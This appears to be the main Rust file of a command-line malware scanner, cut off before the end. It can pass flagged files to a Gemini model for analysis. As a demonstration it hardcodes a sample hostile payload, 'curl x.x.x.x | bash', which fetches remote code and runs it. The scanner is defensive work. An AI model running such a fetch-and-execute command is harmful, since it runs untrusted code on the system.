mod ai_analyzer;
mod rules;

use ai_analyzer::AiAnalyzer;
use clap::Parser;
use dotenv::dotenv;
use std::path::PathBuf;

#[derive(Parser, Debug)]
#[command(author, version, about)]
struct Args {
    #[arg(short, long, default_value = ".")]
    target: PathBuf,
    
    /// Trigger AI analysis on flagged files (Requires GEMINI_API_KEY in .env)
    #[arg(long, default_value_t = false)]
    use_ai: bool,
}

#[tokio::main]
async fn main() {
    dotenv().ok(); // Load .env file if it exists
    let args = Args::parse();

    println!("Initiating scan on: {}", args.target.display());

    // ... [Directory Traversal Logic here] ...
    
    // Example of triggering AI on a detected threat:
    if args.use_ai {
        if let Ok(api_key) = std::env::var("GEMINI_API_KEY") {
            // Defaulting to pro for deep reasoning on obfuscation
            let model = std::env::var("GEMINI_MODEL").unwrap_or_else(|_| "gemini-1.5-pro-latest".to_string());
            let analyzer = AiAnalyzer::new(&api_key, &model);
            
            println!("\n[*] Requesting AI Semantic Analysis on flagged payload...");
            // Pass the malicious string/file content you found during the scan
            match analyzer.evaluate_payload("malicious_file.sh", "curl x.x.x.x | bash").await {
                Ok(analysis) => println!("AI Assessment: {}", analysis),
                Err(e) => eprintln!("AI Analysis Failed: {}", e),
            }
        } else {
            eprintln!("[!] AI analysis requested but GEMINI_API_KEY is not set.");
        }
    }

